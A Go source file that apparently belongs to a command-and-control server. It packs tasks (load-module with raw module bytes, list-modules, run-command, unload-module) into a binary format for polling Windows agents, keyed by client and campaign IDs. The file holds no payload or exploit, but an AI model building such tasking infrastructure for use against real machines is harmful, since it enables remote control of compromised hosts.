package packager

import (
	"encoding/binary"
	"encoding/json"
	"fmt"
	"strconv"
)

type TaskRecord struct {
	TaskID     int32
	ClientID   int32
	CampaignID string
	Kind       string
	Module     string
	ModuleID   int32
	Command    string
	Code       int32
	Args       string
	Status     string
	ModuleData []byte
}

type taskArg struct {
	Type  string `json:"type"`
	Value any    `json:"value"`
}

// RESP_NO_TASKS is the 4-byte response sent when a poll has nothing to run.
const RESP_NO_TASKS int32 = 0xa1

var taskWireCodes = map[string]int32{
	"load-module":   0xb1,
	"list-modules":  0xb2,
	"run-command":   0xb3,
	"unload-module": 0xb4,
}

func PackTasks(tasks []TaskRecord) []byte {
	w := &Writer{}
	if len(tasks) == 0 {
		w.Pack4(RESP_NO_TASKS)
		return w.Bytes()
	}
	w.Pack4(int32(len(tasks)))
	for _, task := range tasks {
		w.Pack4(task.TaskID)
		w.Pack4(taskWireCodes[task.Kind])
		switch task.Kind {
		case "load-module":
			w.Pack4(task.ModuleID)
			w.Pack4(int32(len(task.ModuleData)))
			w.PackBytes(task.ModuleData)
		case "list-modules", "unload-module":
			w.Pack4(task.ModuleID)
		case "run-command":
			w.Pack4(task.ModuleID)
			w.Pack4(task.Code)
			writeArgs(w, task.Args)
		}
	}
	return w.Bytes()
}

func writeArgs(w *Writer, data string) {
	var args []taskArg
	if data != "" {
		_ = json.Unmarshal([]byte(data), &args)
	}
	w.Pack4(int32(len(args)))
	for _, arg := range args {
		switch arg.Type {
		case "int32", "int", "integer":
			w.Pack4(toInt32(arg.Value))
		case "string":
			writeString(w, toString(arg.Value))
		default:
			switch arg.Value.(type) {
			case string:
				writeString(w, toString(arg.Value))
			default:
				w.Pack4(toInt32(arg.Value))
			}
		}
	}
}

// String args are length-prefixed and NUL-terminated so modules can pass the
// buffer straight to Win32 APIs without copying it.
func writeString(w *Writer, value string) {
	w.Pack4(int32(len(value) + 1))
	w.PackBytes([]byte(value))
	w.PackBytes([]byte{0})
}

func toString(value any) string {
	if text, ok := value.(string); ok {
		return text
	}
	return fmt.Sprint(value)
}

func toInt32(value any) int32 {
	switch number := value.(type) {
	case int:
		return int32(number)
	case int32:
		return number
	case int64:
		return int32(number)
	case float64:
		return int32(number)
	case json.Number:
		parsed, _ := number.Int64()
		return int32(parsed)
	case string:
		parsed, _ := strconv.ParseInt(number, 10, 32)
		return int32(parsed)
	default:
		return 0
	}
}

type Writer struct {
	buf []byte
}

func (w *Writer) Pack4(value int32) {
	var data [4]byte
	binary.LittleEndian.PutUint32(data[:], uint32(value))
	w.buf = append(w.buf, data[:]...)
}

func (w *Writer) Pack8(value int64) {
	var data [8]byte
	binary.LittleEndian.PutUint64(data[:], uint64(value))
	w.buf = append(w.buf, data[:]...)
}

func (w *Writer) PackBytes(data []byte) {
	w.buf = append(w.buf, data...)
}

func (w *Writer) Bytes() []byte {
	return w.buf
}
